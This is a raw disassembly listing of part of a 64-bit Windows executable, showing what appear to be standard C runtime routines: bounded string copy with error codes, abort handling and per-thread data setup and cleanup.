   140007269:	cc                   	int3
   14000726a:	cc                   	int3
   14000726b:	cc                   	int3
   14000726c:	cc                   	int3
   14000726d:	cc                   	int3
   14000726e:	cc                   	int3
   14000726f:	cc                   	int3
   140007270:	48 83 ec 28          	sub    $0x28,%rsp
   140007274:	4c 8b c9             	mov    %rcx,%r9
   140007277:	48 85 c9             	test   %rcx,%rcx
   14000727a:	74 0d                	je     0x140007289
   14000727c:	48 85 d2             	test   %rdx,%rdx
   14000727f:	74 08                	je     0x140007289
   140007281:	4d 85 c0             	test   %r8,%r8
   140007284:	75 1d                	jne    0x1400072a3
   140007286:	44 88 01             	mov    %r8b,(%rcx)
   140007289:	e8 de 0c 00 00       	call   0x140007f6c
   14000728e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140007294:	e8 2b 0b 00 00       	call   0x140007dc4
   140007299:	b8 16 00 00 00       	mov    $0x16,%eax
   14000729e:	48 83 c4 28          	add    $0x28,%rsp
   1400072a2:	c3                   	ret
   1400072a3:	4d 2b c1             	sub    %r9,%r8
   1400072a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400072ad:	00 00 00 
   1400072b0:	41 0f b6 04 08       	movzbl (%r8,%rcx,1),%eax
   1400072b5:	88 01                	mov    %al,(%rcx)
   1400072b7:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   1400072bb:	84 c0                	test   %al,%al
   1400072bd:	74 28                	je     0x1400072e7
   1400072bf:	48 83 ea 01          	sub    $0x1,%rdx
   1400072c3:	75 eb                	jne    0x1400072b0
   1400072c5:	48 85 d2             	test   %rdx,%rdx
   1400072c8:	75 1d                	jne    0x1400072e7
   1400072ca:	41 88 11             	mov    %dl,(%r9)
   1400072cd:	e8 9a 0c 00 00       	call   0x140007f6c
   1400072d2:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   1400072d8:	e8 e7 0a 00 00       	call   0x140007dc4
   1400072dd:	b8 22 00 00 00       	mov    $0x22,%eax
   1400072e2:	48 83 c4 28          	add    $0x28,%rsp
   1400072e6:	c3                   	ret
   1400072e7:	33 c0                	xor    %eax,%eax
   1400072e9:	48 83 c4 28          	add    $0x28,%rsp
   1400072ed:	c3                   	ret
   1400072ee:	cc                   	int3
   1400072ef:	cc                   	int3
   1400072f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400072f4:	e8 db 40 00 00       	call   0x14000b3d4
   1400072f9:	48 85 c0             	test   %rax,%rax
   1400072fc:	74 0a                	je     0x140007308
   1400072fe:	b9 16 00 00 00       	mov    $0x16,%ecx
   140007303:	e8 1c 41 00 00       	call   0x14000b424
   140007308:	f6 05 71 6d 01 00 02 	testb  $0x2,0x16d71(%rip)        # 0x14001e080
   14000730f:	74 2a                	je     0x14000733b
   140007311:	b9 17 00 00 00       	mov    $0x17,%ecx
   140007316:	ff 15 2c 8e 00 00    	call   *0x8e2c(%rip)        # 0x140010148
   14000731c:	85 c0                	test   %eax,%eax
   14000731e:	74 07                	je     0x140007327
   140007320:	b9 07 00 00 00       	mov    $0x7,%ecx
   140007325:	cd 29                	int    $0x29
   140007327:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000732d:	ba 15 00 00 40       	mov    $0x40000015,%edx
   140007332:	41 8d 48 02          	lea    0x2(%r8),%ecx
   140007336:	e8 bd 07 00 00       	call   0x140007af8
   14000733b:	b9 03 00 00 00       	mov    $0x3,%ecx
   140007340:	e8 7f f7 ff ff       	call   0x140006ac4
   140007345:	cc                   	int3
   140007346:	cc                   	int3
   140007347:	cc                   	int3
   140007348:	cc                   	int3
   140007349:	cc                   	int3
   14000734a:	cc                   	int3
   14000734b:	cc                   	int3
   14000734c:	cc                   	int3
   14000734d:	cc                   	int3
   14000734e:	cc                   	int3
   14000734f:	cc                   	int3
   140007350:	e9 3b 0c 00 00       	jmp    0x140007f90
   140007355:	cc                   	int3
   140007356:	cc                   	int3
   140007357:	cc                   	int3
   140007358:	cc                   	int3
   140007359:	cc                   	int3
   14000735a:	cc                   	int3
   14000735b:	cc                   	int3
   14000735c:	cc                   	int3
   14000735d:	cc                   	int3
   14000735e:	cc                   	int3
   14000735f:	cc                   	int3
   140007360:	40 57                	rex push %rdi
   140007362:	48 83 ec 20          	sub    $0x20,%rsp
   140007366:	48 83 39 00          	cmpq   $0x0,(%rcx)
   14000736a:	48 8b f9             	mov    %rcx,%rdi
   14000736d:	75 49                	jne    0x1400073b8
   14000736f:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140007374:	ff 15 1e 8d 00 00    	call   *0x8d1e(%rip)        # 0x140010098
   14000737a:	80 7f 10 00          	cmpb   $0x0,0x10(%rdi)
   14000737e:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140007382:	75 0c                	jne    0x140007390
   140007384:	33 d2                	xor    %edx,%edx
   140007386:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   14000738a:	48 89 57 08          	mov    %rdx,0x8(%rdi)
   14000738e:	eb 04                	jmp    0x140007394
   140007390:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   140007394:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007399:	e8 d2 05 00 00       	call   0x140007970
   14000739e:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   1400073a2:	48 8b d8             	mov    %rax,%rbx
   1400073a5:	48 89 07             	mov    %rax,(%rdi)
   1400073a8:	ff 15 f2 8c 00 00    	call   *0x8cf2(%rip)        # 0x1400100a0
   1400073ae:	48 85 db             	test   %rbx,%rbx
   1400073b1:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400073b6:	74 09                	je     0x1400073c1
   1400073b8:	48 8b 07             	mov    (%rdi),%rax
   1400073bb:	48 83 c4 20          	add    $0x20,%rsp
   1400073bf:	5f                   	pop    %rdi
   1400073c0:	c3                   	ret
   1400073c1:	e8 2a ff ff ff       	call   0x1400072f0
   1400073c6:	cc                   	int3
   1400073c7:	cc                   	int3
   1400073c8:	cc                   	int3
   1400073c9:	cc                   	int3
   1400073ca:	cc                   	int3
   1400073cb:	cc                   	int3
   1400073cc:	cc                   	int3
   1400073cd:	cc                   	int3
   1400073ce:	cc                   	int3
   1400073cf:	cc                   	int3
   1400073d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400073d5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400073da:	57                   	push   %rdi
   1400073db:	48 83 ec 20          	sub    $0x20,%rsp
   1400073df:	48 8b f9             	mov    %rcx,%rdi
   1400073e2:	e8 79 ff ff ff       	call   0x140007360
   1400073e7:	48 8d 57 18          	lea    0x18(%rdi),%rdx
   1400073eb:	48 8b c8             	mov    %rax,%rcx
   1400073ee:	48 8b f0             	mov    %rax,%rsi
   1400073f1:	4c 8b 80 90 00 00 00 	mov    0x90(%rax),%r8
   1400073f8:	4c 89 02             	mov    %r8,(%rdx)
   1400073fb:	4c 8b 80 88 00 00 00 	mov    0x88(%rax),%r8
   140007402:	4c 89 47 20          	mov    %r8,0x20(%rdi)
   140007406:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   14000740a:	e8 81 47 00 00       	call   0x14000bb90
   14000740f:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   140007413:	48 8d 57 20          	lea    0x20(%rdi),%rdx
   140007417:	48 8b ce             	mov    %rsi,%rcx
   14000741a:	e8 dd 47 00 00       	call   0x14000bbfc
   14000741f:	8b 86 a8 03 00 00    	mov    0x3a8(%rsi),%eax
   140007425:	a8 02                	test   $0x2,%al
   140007427:	75 0d                	jne    0x140007436
   140007429:	83 c8 02             	or     $0x2,%eax
   14000742c:	89 86 a8 03 00 00    	mov    %eax,0x3a8(%rsi)
   140007432:	c6 47 28 02          	movb   $0x2,0x28(%rdi)
   140007436:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000743b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007440:	48 83 c4 20          	add    $0x20,%rsp
   140007444:	5f                   	pop    %rdi
   140007445:	c3                   	ret
   140007446:	cc                   	int3
   140007447:	cc                   	int3
   140007448:	cc                   	int3
   140007449:	cc                   	int3
   14000744a:	cc                   	int3
   14000744b:	cc                   	int3
   14000744c:	cc                   	int3
   14000744d:	cc                   	int3
   14000744e:	cc                   	int3
   14000744f:	cc                   	int3
   140007450:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007455:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000745a:	57                   	push   %rdi
   14000745b:	48 83 ec 20          	sub    $0x20,%rsp
   14000745f:	49 8b d9             	mov    %r9,%rbx
   140007462:	49 8b f8             	mov    %r8,%rdi
   140007465:	8b 0a                	mov    (%rdx),%ecx
   140007467:	e8 24 28 00 00       	call   0x140009c90
   14000746c:	90                   	nop
   14000746d:	48 8b 07             	mov    (%rdi),%rax
   140007470:	48 8b 08             	mov    (%rax),%rcx
   140007473:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   14000747a:	f0 ff 00             	lock incl (%rax)
   14000747d:	8b 0b                	mov    (%rbx),%ecx
   14000747f:	e8 60 28 00 00       	call   0x140009ce4
   140007484:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007489:	48 83 c4 20          	add    $0x20,%rsp
   14000748d:	5f                   	pop    %rdi
   14000748e:	c3                   	ret
   14000748f:	cc                   	int3
   140007490:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007495:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000749a:	57                   	push   %rdi
   14000749b:	48 83 ec 20          	sub    $0x20,%rsp
   14000749f:	49 8b d9             	mov    %r9,%rbx
   1400074a2:	49 8b f8             	mov    %r8,%rdi
   1400074a5:	8b 0a                	mov    (%rdx),%ecx
   1400074a7:	e8 e4 27 00 00       	call   0x140009c90
   1400074ac:	90                   	nop
   1400074ad:	48 8b 0f             	mov    (%rdi),%rcx
   1400074b0:	33 d2                	xor    %edx,%edx
   1400074b2:	48 8b 09             	mov    (%rcx),%rcx
   1400074b5:	e8 5e 03 00 00       	call   0x140007818
   1400074ba:	90                   	nop
   1400074bb:	8b 0b                	mov    (%rbx),%ecx
   1400074bd:	e8 22 28 00 00       	call   0x140009ce4
   1400074c2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400074c7:	48 83 c4 20          	add    $0x20,%rsp
   1400074cb:	5f                   	pop    %rdi
   1400074cc:	c3                   	ret
   1400074cd:	cc                   	int3
   1400074ce:	cc                   	int3
   1400074cf:	cc                   	int3
   1400074d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400074d5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400074da:	57                   	push   %rdi
   1400074db:	48 83 ec 20          	sub    $0x20,%rsp
   1400074df:	49 8b d9             	mov    %r9,%rbx
   1400074e2:	49 8b f8             	mov    %r8,%rdi
   1400074e5:	8b 0a                	mov    (%rdx),%ecx
   1400074e7:	e8 a4 27 00 00       	call   0x140009c90
   1400074ec:	90                   	nop
   1400074ed:	48 8b 47 08          	mov    0x8(%rdi),%rax
   1400074f1:	48 8b 10             	mov    (%rax),%rdx
   1400074f4:	48 8b 0f             	mov    (%rdi),%rcx
   1400074f7:	48 8b 12             	mov    (%rdx),%rdx
   1400074fa:	48 8b 09             	mov    (%rcx),%rcx
   1400074fd:	e8 16 03 00 00       	call   0x140007818
   140007502:	90                   	nop
   140007503:	8b 0b                	mov    (%rbx),%ecx
   140007505:	e8 da 27 00 00       	call   0x140009ce4
   14000750a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000750f:	48 83 c4 20          	add    $0x20,%rsp
   140007513:	5f                   	pop    %rdi
   140007514:	c3                   	ret
   140007515:	cc                   	int3
   140007516:	cc                   	int3
   140007517:	cc                   	int3
   140007518:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000751d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140007522:	57                   	push   %rdi
   140007523:	48 83 ec 20          	sub    $0x20,%rsp
   140007527:	49 8b d9             	mov    %r9,%rbx
   14000752a:	49 8b f8             	mov    %r8,%rdi
   14000752d:	8b 0a                	mov    (%rdx),%ecx
   14000752f:	e8 5c 27 00 00       	call   0x140009c90
   140007534:	90                   	nop
   140007535:	48 8b 07             	mov    (%rdi),%rax
   140007538:	48 8b 08             	mov    (%rax),%rcx
   14000753b:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   140007542:	48 85 c9             	test   %rcx,%rcx
   140007545:	74 1e                	je     0x140007565
   140007547:	83 c8 ff             	or     $0xffffffff,%eax
   14000754a:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   14000754e:	83 f8 01             	cmp    $0x1,%eax
   140007551:	75 12                	jne    0x140007565
   140007553:	48 8d 05 56 6b 01 00 	lea    0x16b56(%rip),%rax        # 0x14001e0b0
   14000755a:	48 3b c8             	cmp    %rax,%rcx
   14000755d:	74 06                	je     0x140007565
   14000755f:	e8 ac 0a 00 00       	call   0x140008010
   140007564:	90                   	nop
   140007565:	8b 0b                	mov    (%rbx),%ecx
   140007567:	e8 78 27 00 00       	call   0x140009ce4
   14000756c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007571:	48 83 c4 20          	add    $0x20,%rsp
   140007575:	5f                   	pop    %rdi
   140007576:	c3                   	ret
   140007577:	cc                   	int3
   140007578:	40 55                	rex push %rbp
   14000757a:	48 8b ec             	mov    %rsp,%rbp
   14000757d:	48 83 ec 50          	sub    $0x50,%rsp
   140007581:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   140007585:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140007589:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000758d:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140007591:	ba 01 00 00 00       	mov    $0x1,%edx
   140007596:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000759a:	b8 05 00 00 00       	mov    $0x5,%eax
   14000759f:	89 45 20             	mov    %eax,0x20(%rbp)
   1400075a2:	89 45 28             	mov    %eax,0x28(%rbp)
   1400075a5:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   1400075a9:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400075ad:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   1400075b1:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400075b5:	b8 04 00 00 00       	mov    $0x4,%eax
   1400075ba:	89 45 d0             	mov    %eax,-0x30(%rbp)
   1400075bd:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   1400075c0:	48 8d 05 b1 7f 01 00 	lea    0x17fb1(%rip),%rax        # 0x14001f578
   1400075c7:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400075cb:	89 51 28             	mov    %edx,0x28(%rcx)
   1400075ce:	48 8d 0d 0b a7 00 00 	lea    0xa70b(%rip),%rcx        # 0x140011ce0
   1400075d5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400075d9:	48 89 08             	mov    %rcx,(%rax)
   1400075dc:	48 8d 0d cd 6a 01 00 	lea    0x16acd(%rip),%rcx        # 0x14001e0b0
   1400075e3:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400075e7:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   1400075ed:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400075f1:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   1400075f8:	8d 4a 42             	lea    0x42(%rdx),%ecx
   1400075fb:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400075ff:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140007603:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   14000760a:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000760e:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   140007615:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140007619:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000761d:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   140007624:	00 
   140007625:	e8 26 fe ff ff       	call   0x140007450
   14000762a:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   14000762e:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140007632:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   140007636:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000763a:	e8 91 fe ff ff       	call   0x1400074d0
   14000763f:	48 83 c4 50          	add    $0x50,%rsp
   140007643:	5d                   	pop    %rbp
   140007644:	c3                   	ret
   140007645:	cc                   	int3
   140007646:	cc                   	int3
   140007647:	cc                   	int3
   140007648:	48 85 c9             	test   %rcx,%rcx
   14000764b:	74 1a                	je     0x140007667
   14000764d:	53                   	push   %rbx
   14000764e:	48 83 ec 20          	sub    $0x20,%rsp
   140007652:	48 8b d9             	mov    %rcx,%rbx
   140007655:	e8 0e 00 00 00       	call   0x140007668
   14000765a:	48 8b cb             	mov    %rbx,%rcx
   14000765d:	e8 ae 09 00 00       	call   0x140008010
   140007662:	48 83 c4 20          	add    $0x20,%rsp
   140007666:	5b                   	pop    %rbx
   140007667:	c3                   	ret
   140007668:	40 55                	rex push %rbp
   14000766a:	48 8b ec             	mov    %rsp,%rbp
   14000766d:	48 83 ec 40          	sub    $0x40,%rsp
   140007671:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140007675:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140007679:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000767d:	48 8d 15 5c a6 00 00 	lea    0xa65c(%rip),%rdx        # 0x140011ce0
   140007684:	b8 05 00 00 00       	mov    $0x5,%eax
   140007689:	89 45 20             	mov    %eax,0x20(%rbp)
   14000768c:	89 45 28             	mov    %eax,0x28(%rbp)
   14000768f:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140007693:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140007697:	b8 04 00 00 00       	mov    $0x4,%eax
   14000769c:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000769f:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   1400076a2:	48 8b 01             	mov    (%rcx),%rax
   1400076a5:	48 3b c2             	cmp    %rdx,%rax
   1400076a8:	74 0c                	je     0x1400076b6
   1400076aa:	48 8b c8             	mov    %rax,%rcx
   1400076ad:	e8 5e 09 00 00       	call   0x140008010
   1400076b2:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400076b6:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   1400076ba:	e8 51 09 00 00       	call   0x140008010
   1400076bf:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400076c3:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   1400076c7:	e8 44 09 00 00       	call   0x140008010
   1400076cc:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400076d0:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   1400076d4:	e8 37 09 00 00       	call   0x140008010
   1400076d9:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400076dd:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   1400076e1:	e8 2a 09 00 00       	call   0x140008010
   1400076e6:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400076ea:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   1400076ee:	e8 1d 09 00 00       	call   0x140008010
   1400076f3:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400076f7:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   1400076fb:	e8 10 09 00 00       	call   0x140008010
   140007700:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140007704:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   140007708:	e8 03 09 00 00       	call   0x140008010
   14000770d:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140007711:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140007718:	e8 f3 08 00 00       	call   0x140008010
   14000771d:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140007721:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   140007728:	e8 e3 08 00 00       	call   0x140008010
   14000772d:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140007731:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140007735:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140007739:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000773d:	e8 d6 fd ff ff       	call   0x140007518
   140007742:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140007746:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   14000774a:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   14000774e:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140007752:	e8 39 fd ff ff       	call   0x140007490
   140007757:	48 83 c4 40          	add    $0x40,%rsp
   14000775b:	5d                   	pop    %rbp
   14000775c:	c3                   	ret
   14000775d:	cc                   	int3
   14000775e:	cc                   	int3
   14000775f:	cc                   	int3
   140007760:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007765:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000776a:	57                   	push   %rdi
   14000776b:	48 83 ec 20          	sub    $0x20,%rsp
   14000776f:	ff 15 23 89 00 00    	call   *0x8923(%rip)        # 0x140010098
   140007775:	8b 0d 15 69 01 00    	mov    0x16915(%rip),%ecx        # 0x14001e090
   14000777b:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   14000777f:	8b f8                	mov    %eax,%edi
   140007781:	e8 0a 37 00 00       	call   0x14000ae90
   140007786:	33 f6                	xor    %esi,%esi
   140007788:	85 c0                	test   %eax,%eax
   14000778a:	75 0c                	jne    0x140007798
   14000778c:	8b cf                	mov    %edi,%ecx
   14000778e:	ff 15 0c 89 00 00    	call   *0x890c(%rip)        # 0x1400100a0
   140007794:	33 c0                	xor    %eax,%eax
   140007796:	eb 6d                	jmp    0x140007805
   140007798:	ba c8 03 00 00       	mov    $0x3c8,%edx
   14000779d:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400077a2:	e8 e9 07 00 00       	call   0x140007f90
   1400077a7:	8b 0d e3 68 01 00    	mov    0x168e3(%rip),%ecx        # 0x14001e090
   1400077ad:	48 8b d8             	mov    %rax,%rbx
   1400077b0:	48 85 c0             	test   %rax,%rax
   1400077b3:	75 10                	jne    0x1400077c5
   1400077b5:	33 d2                	xor    %edx,%edx
   1400077b7:	e8 d4 36 00 00       	call   0x14000ae90
   1400077bc:	33 c9                	xor    %ecx,%ecx
   1400077be:	e8 4d 08 00 00       	call   0x140008010
   1400077c3:	eb c7                	jmp    0x14000778c
   1400077c5:	48 8b d3             	mov    %rbx,%rdx
   1400077c8:	e8 c3 36 00 00       	call   0x14000ae90
   1400077cd:	85 c0                	test   %eax,%eax
   1400077cf:	75 17                	jne    0x1400077e8
   1400077d1:	8b 0d b9 68 01 00    	mov    0x168b9(%rip),%ecx        # 0x14001e090
   1400077d7:	33 d2                	xor    %edx,%edx
   1400077d9:	e8 b2 36 00 00       	call   0x14000ae90
   1400077de:	48 8b cb             	mov    %rbx,%rcx
   1400077e1:	e8 2a 08 00 00       	call   0x140008010
   1400077e6:	eb 12                	jmp    0x1400077fa
   1400077e8:	48 8b cb             	mov    %rbx,%rcx
   1400077eb:	e8 88 fd ff ff       	call   0x140007578
   1400077f0:	33 c9                	xor    %ecx,%ecx
   1400077f2:	e8 19 08 00 00       	call   0x140008010
   1400077f7:	48 8b f3             	mov    %rbx,%rsi
   1400077fa:	8b cf                	mov    %edi,%ecx
   1400077fc:	ff 15 9e 88 00 00    	call   *0x889e(%rip)        # 0x1400100a0
   140007802:	48 8b c6             	mov    %rsi,%rax
   140007805:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000780a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000780f:	48 83 c4 20          	add    $0x20,%rsp
   140007813:	5f                   	pop    %rdi
   140007814:	c3                   	ret
   140007815:	cc                   	int3
   140007816:	cc                   	int3
   140007817:	cc                   	int3
   140007818:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000781d:	57                   	push   %rdi
   14000781e:	48 83 ec 20          	sub    $0x20,%rsp
   140007822:	48 8b f9             	mov    %rcx,%rdi
   140007825:	48 8b da             	mov    %rdx,%rbx
   140007828:	48 8b 89 90 00 00 00 	mov    0x90(%rcx),%rcx
   14000782f:	48 85 c9             	test   %rcx,%rcx
   140007832:	74 2c                	je     0x140007860
   140007834:	e8 57 32 00 00       	call   0x14000aa90
   140007839:	48 8b 8f 90 00 00 00 	mov    0x90(%rdi),%rcx
   140007840:	48 3b 0d 31 7d 01 00 	cmp    0x17d31(%rip),%rcx        # 0x14001f578
   140007847:	74 17                	je     0x140007860
   140007849:	48 8d 05 a0 6d 01 00 	lea    0x16da0(%rip),%rax        # 0x14001e5f0
   140007850:	48 3b c8             	cmp    %rax,%rcx
   140007853:	74 0b                	je     0x140007860
   140007855:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   140007859:	75 05                	jne    0x140007860
   14000785b:	e8 30 30 00 00       	call   0x14000a890
   140007860:	48 89 9f 90 00 00 00 	mov    %rbx,0x90(%rdi)
   140007867:	48 85 db             	test   %rbx,%rbx
   14000786a:	74 08                	je     0x140007874
   14000786c:	48 8b cb             	mov    %rbx,%rcx
   14000786f:	e8 90 2f 00 00       	call   0x14000a804
   140007874:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007879:	48 83 c4 20          	add    $0x20,%rsp
   14000787d:	5f                   	pop    %rdi
   14000787e:	c3                   	ret
   14000787f:	cc                   	int3
   140007880:	48 83 ec 28          	sub    $0x28,%rsp
   140007884:	e8 57 00 00 00       	call   0x1400078e0
   140007889:	48 85 c0             	test   %rax,%rax
   14000788c:	74 05                	je     0x140007893
   14000788e:	48 83 c4 28          	add    $0x28,%rsp
   140007892:	c3                   	ret
   140007893:	e8 58 fa ff ff       	call   0x1400072f0
   140007898:	cc                   	int3
   140007899:	cc                   	int3
   14000789a:	cc                   	int3
   14000789b:	cc                   	int3
   14000789c:	48 83 ec 38          	sub    $0x38,%rsp
   1400078a0:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   1400078a7:	ff ff 
   1400078a9:	8b 0d e1 67 01 00    	mov    0x167e1(%rip),%ecx        # 0x14001e090
   1400078af:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400078b2:	75 04                	jne    0x1400078b8
   1400078b4:	33 c0                	xor    %eax,%eax
   1400078b6:	eb 06                	jmp    0x1400078be
   1400078b8:	e8 bf 35 00 00       	call   0x14000ae7c
   1400078bd:	90                   	nop
   1400078be:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400078c2:	74 14                	je     0x1400078d8
   1400078c4:	48 85 c0             	test   %rax,%rax
   1400078c7:	75 0a                	jne    0x1400078d3
   1400078c9:	e8 92 fe ff ff       	call   0x140007760
   1400078ce:	48 85 c0             	test   %rax,%rax
   1400078d1:	74 05                	je     0x1400078d8
   1400078d3:	48 83 c4 38          	add    $0x38,%rsp
   1400078d7:	c3                   	ret
   1400078d8:	e8 13 fa ff ff       	call   0x1400072f0
   1400078dd:	cc                   	int3
   1400078de:	cc                   	int3
   1400078df:	cc                   	int3
   1400078e0:	40 57                	rex push %rdi
   1400078e2:	48 83 ec 30          	sub    $0x30,%rsp
   1400078e6:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   1400078ed:	ff ff 
   1400078ef:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400078f4:	33 ff                	xor    %edi,%edi
   1400078f6:	40 38 3d ab 75 01 00 	cmp    %dil,0x175ab(%rip)        # 0x14001eea8
   1400078fd:	74 2a                	je     0x140007929
   1400078ff:	8b 0d 8b 67 01 00    	mov    0x1678b(%rip),%ecx        # 0x14001e090
   140007905:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140007908:	75 04                	jne    0x14000790e
   14000790a:	8b c7                	mov    %edi,%eax
   14000790c:	eb 06                	jmp    0x140007914
   14000790e:	e8 71 35 00 00       	call   0x14000ae84
   140007913:	90                   	nop
   140007914:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140007918:	74 48                	je     0x140007962
   14000791a:	48 85 c0             	test   %rax,%rax
   14000791d:	75 05                	jne    0x140007924
   14000791f:	e8 3c fe ff ff       	call   0x140007760
   140007924:	48 8b f8             	mov    %rax,%rdi
   140007927:	eb 39                	jmp    0x140007962
   140007929:	ff 15 69 87 00 00    	call   *0x8769(%rip)        # 0x140010098
   14000792f:	8b d8                	mov    %eax,%ebx
   140007931:	8b 0d 59 67 01 00    	mov    0x16759(%rip),%ecx        # 0x14001e090
   140007937:	83 f9 ff             	cmp    $0xffffffff,%ecx
   14000793a:	75 05                	jne    0x140007941
   14000793c:	48 8b c7             	mov    %rdi,%rax
   14000793f:	eb 06                	jmp    0x140007947
   140007941:	e8 36 35 00 00       	call   0x14000ae7c
   140007946:	90                   	nop
   140007947:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000794b:	74 0d                	je     0x14000795a
   14000794d:	48 85 c0             	test   %rax,%rax
   140007950:	75 05                	jne    0x140007957
   140007952:	e8 09 fe ff ff       	call   0x140007760
   140007957:	48 8b f8             	mov    %rax,%rdi
   14000795a:	8b cb                	mov    %ebx,%ecx
